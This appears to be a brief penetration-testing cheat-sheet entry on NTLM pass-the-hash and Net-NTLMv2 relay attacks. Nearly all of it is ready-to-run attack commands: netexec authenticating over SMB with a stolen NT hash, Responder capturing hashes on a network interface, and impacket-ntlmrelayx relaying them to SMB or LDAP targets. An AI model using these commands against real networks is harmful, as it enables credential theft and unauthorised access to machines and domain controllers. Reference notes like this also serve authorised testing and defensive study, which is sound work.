# 10.02 Pass-the-Hash Net-NTLMv2 Relay

> Reuse NT hashes directly via SMB/WMI, or capture NetNTLMv2 with Responder and relay it through `ntlmrelayx` to SMB/LDAP/HTTP.

## Overview

NTLM hash usable directly via SMB/WMI (PtH). NetNTLMv2 captured by Responder can be relayed (ntlmrelayx) to SMB/LDAP/HTTP to gain access without ever cracking.

## Steps

- **PtH with hash** — `netexec smb -H <NT>`.
- **Capture v2** — responder -I tun0.
- **Relay** — ntlmrelayx -t smb://<TARGET> --no-smb-server (or -t ldap://dc).

## Commands

### PtH + relay

```bash
netexec smb <TARGET> -u <USER> -H aad3b435b51404eeaad3b435b51404ee:31d6...
sudo responder -I tun0 -wv
impacket-ntlmrelayx -t smb://<TARGET> -smb2support --no-smb-server
```
